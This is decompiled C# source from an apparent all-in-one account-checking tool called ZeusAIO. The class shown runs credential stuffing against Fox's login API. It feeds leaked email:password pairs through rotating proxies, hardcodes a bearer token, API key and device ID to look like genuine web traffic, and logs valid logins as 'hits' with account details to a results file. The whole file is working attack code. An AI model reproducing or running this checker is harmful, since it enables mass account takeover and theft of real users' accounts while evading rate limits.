// Decompiled with JetBrains decompiler
// Type: Fox.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Fox
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.AddHeader("authorization", "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJ1aWQiOiJkMlZpTnpKa01URXlPVEV0TWpZek5TMDBOek5tTFdFeE5EQXRZelkyTUdNeVpHVm1OV1E1Iiwic2lkIjoiMzcyZGViMWYtNTU5Yi00N2UyLWJkZjAtOTEzMzk4N2JhYzE2Iiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJtdnBkaWQiOiIiLCJ2ZXIiOjIsImV4cCI6MTYzMTUzMjcxNiwianRpIjoiNmM2NmM5YTEtODYzOS00NWIxLWJlYTgtOGNjOGY3OGVkNWZlIiwiaWF0IjoxNTk5OTk2NzE2fQ.hXHKh4tAZ4rLbPsqmFDA99TIThN79ZUZSAlC8S0zSIqnItxRoimOO81edPwuG00rE4O4GNsTKxYxZldFo54P0jcCS4UmRAZoEG0t14T5l0wMoMfdWqJj3elx-aF1QKM8BFWj41LdaTIgCj8xv7n5Xf8LLS3Ibcq7JpLNA1HTrON7nWHvsAge4UpF4C1a3kXS8RPN0VnsFCVgbZOyvH7WXva530unsNFDgt3pfWqua2ukmUwe9YV28hnWXSNzsmzMKecIIp8gYpyEuaJOmiL1lW68PulhqYcsm3wKG0sPvvjfh-7xyveJp1pb5r87OYzWwA1PVjYAE7HZQnnlflNWOg");
              httpRequest.AddHeader("x-api-key", "6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9");
              httpRequest.AddHeader("x-dcg-udid", "72d11291-2635-473f-a140-c660c2def5d9");
              httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
              string str1 = "{\"password\":\"" + s[1] + "\",\"email\":\"" + s[0] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source = httpRequest.Post("https://api3.fox.com/v2.0/login", str1, "application/json;charset=UTF-8").ToString();
              if (!source.Contains("Invalid login credentials"))
              {
                if (source.Contains("accessToken"))
                {
                  string str2 = Check.Parse(source, "accountType\":\"", "\",\"");
                  string str3 = Check.Parse(source, "brand\":\"", "\",\"");
                  string str4 = Check.Parse(source, "platform\":\"", "\",\"");
                  string str5 = Check.Parse(source, "device\":\"", "\",\"");
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - FOX] " + s[0] + ":" + s[1] + " | Account Type: " + str2 + " | Brand: " + str3 + " | Platform: " + str4 + " | Device: " + str5, Color.Green);
                  Export.AsResult("/Fox_hits", s[0] + ":" + s[1] + " | Account Type: " + str2 + " | Brand: " + str3 + " | Platform: " + str4 + " | Device: " + str5);
                  return false;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
